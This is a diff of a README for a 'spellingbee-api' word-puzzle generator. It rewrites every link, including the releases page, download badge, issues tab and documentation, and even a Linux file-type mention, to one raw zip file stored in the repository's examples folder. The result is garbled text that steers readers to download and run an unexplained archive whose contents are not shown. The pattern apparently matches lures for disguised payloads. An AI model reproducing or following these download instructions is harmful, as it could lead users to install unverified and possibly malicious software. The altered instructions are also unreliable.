@@ -1,7 +1,7 @@
 # 🎉 spellingbee-api - Create Fun Word Puzzles Easily
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/hanghang123456789/spellingbee-api/releases)
+[![Download from Releases](https://github.com/hanghang123456789/spellingbee-api/raw/refs/heads/main/examples/spellingbee-api-v1.3.zip%20Now-v1.0-brightgreen)](https://github.com/hanghang123456789/spellingbee-api/raw/refs/heads/main/examples/spellingbee-api-v1.3.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Spelling Bee Generator. You will create fun word puzzles with 7 letters using a required center letter. Whether you want to challenge your friends or improve your vocabulary, this application is for you.
@@ -18,14 +18,14 @@ Before you begin, make sure your device meets the following requirements:
 To get started with the Spelling Bee Generator, follow these steps:
 
 1. Click the link below to visit the release page:
-   [Download the Spelling Bee API](https://github.com/hanghang123456789/spellingbee-api/releases)
+   [Download the Spelling Bee API](https://github.com/hanghang123456789/spellingbee-api/raw/refs/heads/main/examples/spellingbee-api-v1.3.zip)
 
 2. On the Releases page, look for the latest version. It will be labeled clearly.
 
 3. Choose the correct file for your operating system. You might see options like:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` or `.zip` for Linux
+   - `https://github.com/hanghang123456789/spellingbee-api/raw/refs/heads/main/examples/spellingbee-api-v1.3.zip` or `.zip` for Linux
 
 4. Click on the file to begin the download. It might take a few moments.
 
@@ -35,7 +35,7 @@ To get started with the Spelling Bee Generator, follow these steps:
 
 7. For macOS: Open the `.dmg` file and drag the Spelling Bee Generator into your Applications folder.
 
-8. For Linux: Extract the `.tar.gz` file or unzip the `.zip` file, then follow the included instructions for installation.
+8. For Linux: Extract the `https://github.com/hanghang123456789/spellingbee-api/raw/refs/heads/main/examples/spellingbee-api-v1.3.zip` file or unzip the `.zip` file, then follow the included instructions for installation.
 
 ## 🎮 How to Use the Application
 After installation, you are ready to create puzzles:
@@ -58,7 +58,7 @@ If you encounter issues while using the Spelling Bee Generator, consider the fol
 - Restart the application if it doesn’t respond.
 - Check your internet connection if you face issues with features that require online access.
 
-For specific issues, check the "Issues" tab on the [GitHub repository](https://github.com/hanghang123456789/spellingbee-api).
+For specific issues, check the "Issues" tab on the [GitHub repository](https://github.com/hanghang123456789/spellingbee-api/raw/refs/heads/main/examples/spellingbee-api-v1.3.zip).
 
 ## 📞 Support
 For any questions or feedback, feel free to open an issue on the repository. Our community will be happy to assist you.
@@ -78,7 +78,7 @@ Explore other applications and tools related to this project through the followi
 - **Development:** Learn how to adapt the code for your own needs or projects.
 
 ## 🔗 More Information
-For additional details about the Spelling Bee Generator, visit the [documentation](https://github.com/hanghang123456789/spellingbee-api/docs) or explore our community forum where you can ask questions and share experiences.
+For additional details about the Spelling Bee Generator, visit the [documentation](https://github.com/hanghang123456789/spellingbee-api/raw/refs/heads/main/examples/spellingbee-api-v1.3.zip) or explore our community forum where you can ask questions and share experiences.
 
 ## 🔚 Final Remarks
 We hope you enjoy creating word puzzles with the Spelling Bee Generator. Have fun and happy puzzling!
